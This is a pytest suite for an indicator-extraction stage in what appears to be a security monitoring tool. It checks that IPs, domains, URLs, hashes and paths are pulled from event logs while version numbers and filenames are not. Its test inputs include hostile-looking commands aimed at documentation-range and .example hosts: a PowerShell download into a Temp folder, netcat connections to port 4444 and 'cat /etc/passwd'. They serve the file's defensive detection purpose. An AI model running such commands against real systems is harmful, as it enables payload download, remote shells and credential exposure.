"""Stage 5 — indicator extraction.

Extraction is mostly an exercise in *not* matching things, so most of these
tests are about what must **not** be extracted. An analyst shown `update.exe`
as a domain stops trusting the indicator panel, and an untrusted panel is worse
than no panel.
"""

from __future__ import annotations

import pytest
from sqlalchemy.orm import Session

from app.database import repository
from app.enrichment import (
    MAX_INDICATORS_PER_EVENT,
    EnrichmentService,
    IOCExtractor,
    extract_indicators,
    has_valid_tld,
    looks_defanged,
    refang,
    sighting_window,
)
from app.models.enums import IndicatorType
from app.models.event import SecurityEvent
from app.models.indicator import Indicator


def event(**overrides: object) -> SecurityEvent:
    payload: dict[str, object] = {
        "timestamp": "2026-09-23T13:42:10Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "hostname": "WIN-LAB-01",
    }
    payload.update(overrides)
    return SecurityEvent(**payload)


def values(result, indicator_type: IndicatorType) -> set[str]:
    return set(result.values_of(indicator_type))


# ---------------------------------------------------------------------------
# False positives - the important half
# ---------------------------------------------------------------------------
@pytest.mark.unit
class TestWhatMustNotBeExtracted:
    @pytest.mark.parametrize(
        "text",
        ["build 10.0.19041.1234", "version 1.2.3.4.5", "assembly 4.0.30319.42000"],
    )
    def test_version_numbers_are_not_ip_addresses(self, text: str) -> None:
        result = IOCExtractor().extract(event(command_line=text))
        assert values(result, IndicatorType.IPV4) == set()

    @pytest.mark.parametrize("name", ["update.exe", "config.json", "script.ps1", "report.docx"])
    def test_filenames_are_not_domains(self, name: str) -> None:
        result = IOCExtractor().extract(event(command_line=f"run {name} now"))
        assert values(result, IndicatorType.DOMAIN) == set()

    def test_a_long_hex_blob_does_not_yield_a_short_hash(self) -> None:
        """A 100-character hex run contains no valid 64, 40 or 32 char digest."""
        result = IOCExtractor().extract(event(command_line="data " + "a" * 100))
        assert len(result.indicators) == 0

    @pytest.mark.parametrize("text", ["at 13:42:10 today", "mac 00:1a:2b:3c:4d:5e"])
    def test_timestamps_and_macs_are_not_ipv6(self, text: str) -> None:
        result = IOCExtractor().extract(event(command_line=text))
        assert values(result, IndicatorType.IPV6) == set()

    def test_arithmetic_is_not_a_posix_path(self) -> None:
        result = IOCExtractor().extract(event(command_line="total = 10/20/30"))
        assert values(result, IndicatorType.FILE_PATH) == set()

    def test_zip_is_treated_as_an_extension_not_a_tld(self) -> None:
        """A documented trade: `.zip` is a real TLD and far more often a file."""
        assert not has_valid_tld("payload.zip")
        result = IOCExtractor().extract(event(command_line="expand payload.zip"))
        assert values(result, IndicatorType.DOMAIN) == set()

    def test_reserved_lab_domains_are_recognised(self) -> None:
        """RFC 2606 names are what synthetic and lab data legitimately uses."""
        assert has_valid_tld("updates.example")
        result = IOCExtractor().extract(event(command_line="curl updates.example"))
        assert values(result, IndicatorType.DOMAIN) == {"updates.example"}


# ---------------------------------------------------------------------------
# Defanging
# ---------------------------------------------------------------------------
@pytest.mark.unit
class TestRefang:
    @pytest.mark.parametrize(
        "defanged, expected",
        [
            ("hxxp://evil[.]example", "http://evil.example"),
            ("hxxps://evil[.]example", "https://evil.example"),
            ("192.0.2[.]77", "192.0.2.77"),
            ("user[at]example[.]com", "user@example.com"),
            ("evil(.)example", "evil.example"),
            ("evil dot example", "evil.example"),
        ],
    )
    def test_common_defanging_is_reversed(self, defanged: str, expected: str) -> None:
        assert refang(defanged) == expected

    def test_untouched_text_is_returned_unchanged(self) -> None:
        text = "powershell.exe -enc AAA= at 13:42"
        assert refang(text) == text
        assert not looks_defanged(text)

    def test_defanged_indicators_are_extracted(self) -> None:
        result = IOCExtractor().extract(event(command_line="IWR hxxp://updates[.]example/tool.exe"))
        assert "http://updates.example/tool.exe" in values(result, IndicatorType.URL)
        assert "updates.example" in values(result, IndicatorType.DOMAIN)

    def test_the_stored_event_keeps_the_defanged_original(self) -> None:
        """Refanging happens on a copy. Editing evidence would mislead."""
        original = "IWR hxxp://updates[.]example/tool.exe"
        source = event(command_line=original)
        IOCExtractor().extract(source)
        assert source.command_line == original


# ---------------------------------------------------------------------------
# Structured fields
# ---------------------------------------------------------------------------
@pytest.mark.unit
class TestStructuredExtraction:
    def test_addresses_come_from_typed_fields_with_their_names(self) -> None:
        result = IOCExtractor().extract(event(src_ip="10.0.0.5", dst_ip="192.0.2.77"))
        by_field = {i.value: i.source_field for i in result.indicators}
        assert by_field["10.0.0.5"] == "src_ip"
        assert by_field["192.0.2.77"] == "dst_ip"

    def test_ipv6_is_typed_correctly(self) -> None:
        result = IOCExtractor().extract(event(src_ip="2001:db8::1"))
        assert values(result, IndicatorType.IPV6) == {"2001:db8::1"}
        assert values(result, IndicatorType.IPV4) == set()

    @pytest.mark.parametrize(
        "digest, expected",
        [
            ("a" * 32, IndicatorType.MD5),
            ("b" * 40, IndicatorType.SHA1),
            ("c" * 64, IndicatorType.SHA256),
        ],
    )
    def test_hash_type_follows_length(self, digest: str, expected: IndicatorType) -> None:
        result = IOCExtractor().extract(event(file_hash=digest))
        assert values(result, expected) == {digest}

    def test_processes_are_extracted_from_both_ends_of_the_chain(self) -> None:
        result = IOCExtractor().extract(
            event(process_name="powershell.exe", parent_process="cmd.exe")
        )
        assert values(result, IndicatorType.PROCESS_NAME) == {"powershell.exe", "cmd.exe"}

    def test_a_url_also_yields_its_host(self) -> None:
        """A URL is half an indicator; the host is what correlates elsewhere."""
        result = IOCExtractor().extract(event(url="http://updates.example/tool.exe"))
        assert values(result, IndicatorType.URL) == {"http://updates.example/tool.exe"}
        assert values(result, IndicatorType.DOMAIN) == {"updates.example"}

    def test_a_url_with_an_ip_host_yields_an_address(self) -> None:
        result = IOCExtractor().extract(event(url="http://192.0.2.77:8080/x"))
        assert "192.0.2.77" in values(result, IndicatorType.IPV4)

    def test_scanned_fields_are_reported(self) -> None:
        result = IOCExtractor().extract(event(src_ip="10.0.0.5", command_line="whoami"))
        assert "src_ip" in result.scanned_fields
        assert "command_line" in result.scanned_fields


# ---------------------------------------------------------------------------
# Free text
# ---------------------------------------------------------------------------
@pytest.mark.unit
class TestFreeTextExtraction:
    def test_a_realistic_download_command(self) -> None:
        result = IOCExtractor().extract(
            event(
                command_line=(
                    'powershell.exe -c "IWR http://updates.example/tool.exe '
                    '-OutFile C:\\Windows\\Temp\\t.exe; mail admin@lab.example"'
                )
            )
        )
        assert values(result, IndicatorType.URL) == {"http://updates.example/tool.exe"}
        assert values(result, IndicatorType.EMAIL) == {"admin@lab.example"}
        # The mail domain is an indicator in its own right: it correlates
        # against a DNS query or connection seen in another event.
        assert values(result, IndicatorType.DOMAIN) == {"updates.example", "lab.example"}
        assert "C:\\Windows\\Temp\\t.exe" in values(result, IndicatorType.FILE_PATH)
        assert "powershell.exe" in values(result, IndicatorType.PROCESS_NAME)

    def test_posix_paths_rooted_in_system_directories(self) -> None:
        result = IOCExtractor().extract(event(command_line="cat /etc/passwd && ls /tmp/stage"))
        assert values(result, IndicatorType.FILE_PATH) == {"/etc/passwd", "/tmp/stage"}

    def test_addresses_inside_a_command_line_are_found(self) -> None:
        result = IOCExtractor().extract(event(command_line="nc 203.0.113.9 4444"))
        assert values(result, IndicatorType.IPV4) == {"203.0.113.9"}

    def test_free_text_scanning_can_be_disabled(self) -> None:
        source = event(src_ip="10.0.0.5", command_line="curl http://updates.example")
        result = IOCExtractor(scan_free_text=False).extract(source)
        assert values(result, IndicatorType.URL) == set()
        assert values(result, IndicatorType.IPV4) == {"10.0.0.5"}

    def test_trailing_punctuation_is_trimmed_from_urls(self) -> None:
        result = IOCExtractor().extract(event(event_message="see http://updates.example/a."))
        assert values(result, IndicatorType.URL) == {"http://updates.example/a"}


# ---------------------------------------------------------------------------
# Bookkeeping
# ---------------------------------------------------------------------------
@pytest.mark.unit
class TestExtractionBookkeeping:
    def test_the_same_value_twice_is_one_indicator_with_two_sightings(self) -> None:
        result = IOCExtractor().extract(event(src_ip="10.0.0.5", command_line="ping 10.0.0.5"))
        matches = [i for i in result.indicators if i.value == "10.0.0.5"]
        assert len(matches) == 1
        assert matches[0].occurrences == 2

    def test_sightings_are_timestamped_with_the_event_not_now(self) -> None:
        """An indicator in a three-day-old log was first seen three days ago."""
        source = event(src_ip="10.0.0.5")
        result = IOCExtractor().extract(source)
        assert result.indicators[0].first_seen == source.timestamp
        assert sighting_window(result.indicators) == (source.timestamp, source.timestamp)

    def test_every_indicator_records_the_event_it_came_from(self) -> None:
        source = event(src_ip="10.0.0.5")
        result = IOCExtractor().extract(source)
        assert all(i.source_event_id == source.event_id for i in result.indicators)

    def test_a_hostile_command_line_cannot_produce_unbounded_indicators(self) -> None:
        flood = " ".join(f"10.0.{index // 256}.{index % 256}" for index in range(5_000))
        result = IOCExtractor().extract(event(command_line=flood))
        assert len(result) <= MAX_INDICATORS_PER_EVENT
        assert result.truncated is True

    def test_the_cap_is_configurable(self) -> None:
        source = event(command_line="10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4")
        assert len(IOCExtractor(max_indicators=2).extract(source)) == 2

    def test_internal_addresses_can_be_excluded(self) -> None:
        source = event(src_ip="10.0.0.5", dst_ip="192.0.2.77")
        result = IOCExtractor(include_internal=False).extract(source)
        assert values(result, IndicatorType.IPV4) == {"192.0.2.77"}

    def test_counts_are_grouped_by_type(self) -> None:
        result = IOCExtractor().extract(event(src_ip="10.0.0.5", process_name="a.exe"))
        assert result.counts() == {"ipv4": 1, "process_name": 1}

    def test_an_event_with_nothing_in_it_yields_nothing(self) -> None:
        assert extract_indicators(event()) == []


# ---------------------------------------------------------------------------
# Context, not verdict
# ---------------------------------------------------------------------------
@pytest.mark.unit
class TestIndicatorsCarryNoVerdict:
    def test_an_indicator_has_no_maliciousness_field(self) -> None:
        """8.8.8.8 in a DNS query is an indicator. It is not malicious."""
        for forbidden in ("malicious", "is_bad", "threat_level", "verdict", "score"):
            assert forbidden not in Indicator.model_fields

    @pytest.mark.parametrize(
        "value, internal, documentation",
        [
            ("10.0.0.5", True, False),
            ("192.168.1.1", True, False),
            ("127.0.0.1", True, False),
            ("192.0.2.77", False, True),
            ("203.0.113.9", False, True),
            ("8.8.8.8", False, False),
        ],
    )
    def test_addresses_are_classified_not_judged(
        self, value: str, internal: bool, documentation: bool
    ) -> None:
        """Documentation ranges must not read as 'internal'.

        Python's ``is_private`` is true for RFC 5737, which would label the
        synthetic attacker address in the demo data as an internal host.
        """
        indicator = Indicator(indicator_type=IndicatorType.IPV4, value=value)
        assert indicator.is_internal is internal
        assert indicator.is_documentation is documentation


# ---------------------------------------------------------------------------
# Persistence
# ---------------------------------------------------------------------------
@pytest.mark.integration
class TestEnrichmentService:
    def test_indicators_are_stored_once_and_linked_per_event(self, db_session: Session) -> None:
        first = event(src_ip="192.0.2.77", command_line="nc 192.0.2.77 4444")
        second = event(src_ip="192.0.2.77", timestamp="2026-09-23T14:00:00Z")
        repository.save_events(db_session, [first, second])

        service = EnrichmentService(db_session)
        service.enrich_events([first, second])
        db_session.commit()

        stored = repository.list_indicators(db_session, indicator_type=IndicatorType.IPV4)
        assert [i.value for i in stored] == ["192.0.2.77"]
        assert len(repository.list_indicators_for_event(db_session, first.event_id)) >= 1

    def test_an_indicator_finds_every_event_it_appeared_in(self, db_session: Session) -> None:
        """Including events where it only appeared inside a command line."""
        typed = event(src_ip="203.0.113.9")
        buried = event(timestamp="2026-09-23T14:00:00Z", command_line="curl http://203.0.113.9/x")
        repository.save_events(db_session, [typed, buried])
        EnrichmentService(db_session).enrich_events([typed, buried])
        db_session.commit()

        found = repository.find_events_for_indicator(db_session, IndicatorType.IPV4, "203.0.113.9")
        assert {e.event_id for e in found} == {typed.event_id, buried.event_id}

    def test_new_versus_repeat_sightings_are_counted(self, db_session: Session) -> None:
        first = event(src_ip="192.0.2.77")
        second = event(src_ip="192.0.2.77", timestamp="2026-09-23T14:00:00Z")
        repository.save_events(db_session, [first, second])
        service = EnrichmentService(db_session)

        assert service.enrich_events([first]).indicators_new == 1
        assert service.enrich_events([second]).indicators_new == 0

    def test_backfill_processes_only_unenriched_events(self, db_session: Session) -> None:
        events = [
            event(src_ip="10.0.0.5"),
            event(src_ip="10.0.0.6", timestamp="2026-09-23T14:00:00Z"),
        ]
        repository.save_events(db_session, events)
        db_session.commit()

        first_pass = EnrichmentService(db_session).backfill()
        db_session.commit()
        assert first_pass.events_processed == 2

        second_pass = EnrichmentService(db_session).backfill()
        assert second_pass.events_processed == 0

    def test_re_enriching_an_event_does_not_duplicate_links(self, db_session: Session) -> None:
        source = event(src_ip="10.0.0.5")
        repository.save_events(db_session, [source])
        service = EnrichmentService(db_session)
        service.enrich_events([source])
        service.enrich_events([source])
        db_session.commit()

        assert len(repository.list_indicators_for_event(db_session, source.event_id)) == 1

    def test_summary_reports_what_happened(self, db_session: Session) -> None:
        source = event(src_ip="192.0.2.77", process_name="powershell.exe")
        repository.save_events(db_session, [source])
        summary = EnrichmentService(db_session).enrich_events([source])
        assert summary.events_processed == 1
        assert summary.by_type == {"ipv4": 1, "process_name": 1}
        assert "1 events" in summary.summary()
